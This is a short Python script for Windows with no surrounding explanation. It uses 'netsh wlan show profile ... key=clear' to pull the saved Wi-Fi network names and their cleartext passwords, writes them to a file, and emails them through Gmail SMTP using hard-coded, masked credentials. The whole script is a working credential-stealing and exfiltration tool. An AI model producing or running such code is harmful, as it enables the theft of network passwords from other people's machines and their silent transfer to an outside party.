#!/usr/bin/python

import subprocess
import smtplib
import re
import ssl
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

command1 = "netsh wlan show profile > wifi.txt"
networks = subprocess.check_output(command1, shell=True)
wf = open("wifi.txt","r")
network_list = re.findall(r"(?:\s*ios:\s)(.*)",wf.read())

#print(" " + str(network_list[0]).strip("\n"))


final_output = ""
for network in network_list:	
		command2 = "netsh wlan show profile \""+network+"\" key=clear > network.txt"
		one_network_result = subprocess.check_output(command2, shell=True)
		
		nf = open("network.txt","r")
		wifi_key = re.findall(r"(?:Chave\s*:\s)(.*)",nf.read())
		print(" " + str(network).strip("\n") + str(wifi_key).strip("\n"))
		final_output += "Network Wifi: "+ str(network).strip("\n")+ " Pwd: " + str(wifi_key)+"\n" 

file = open("wifipasswords.txt","w")
file.write(final_output)
file.close()		

my_email = "XXXXXXXXXXX@gmail.com"
email = "XXXXXXXXXXXX@gmail.com"
password = "XXXXXXXXXXXXX"

print(" Final Output: " + str(final_output))

message = MIMEMultipart("alternative")
part1 = MIMEText(str(final_output), "plain")
message.attach(part1)

server = smtplib.SMTP("smtp.gmail.com", port=587)
context = ssl.create_default_context()
server.starttls(context = context)
server.login(email, password)
server.sendmail(my_email, my_email,message.as_string() )
server.quit()
